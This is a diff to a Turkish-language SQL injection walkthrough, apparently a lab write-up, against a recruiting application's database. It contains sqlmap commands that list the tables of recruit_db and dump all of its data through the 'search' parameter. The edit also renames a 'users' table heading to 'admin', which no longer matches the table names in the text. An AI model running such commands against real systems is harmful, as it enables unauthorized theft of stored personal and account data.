@@ -122,7 +122,7 @@ available databases [6]:
 ```
 <img width="1215" height="587" alt="sqlçıktısı" src="https://github.com/user-attachments/assets/216c958c-5b9b-46ac-ac14-0345e144f3ca" />
 
-Hedef uygulamayla doğrudan ilişkili olan `recruit_db` veritabanı dikkatimi çekti.
+Hedef uygulamayla doğrudan ilişkili olan `recruit_db` veritabanına odaklanalım.
 
 ### Tabloların Listelenmesi
 
@@ -130,12 +130,6 @@ Hedef uygulamayla doğrudan ilişkili olan `recruit_db` veritabanı dikkatimi ç
 sqlmap -r req.txt -p search -D recruit_db --tables --batch --fresh-queries
 ```
 
-```
-+------------+
-| candidates |
-| users      |
-+------------+
-```
 <img width="1191" height="298" alt="tables" src="https://github.com/user-attachments/assets/98686069-1f08-465b-817b-149f17088847" />
 
 ### users Tablosunun Kolonlarının Listelenmesi
@@ -160,7 +154,7 @@ sqlmap -r req.txt -p search -D recruit_db -T users --columns --batch --fresh-que
 sqlmap -r req.txt -p search -D recruit_db --dump-all --batch --fresh-queries
 ```
 
-**users tablosu:**
+**admin tablosu:**
 
 ```
 +----+----------------+----------+
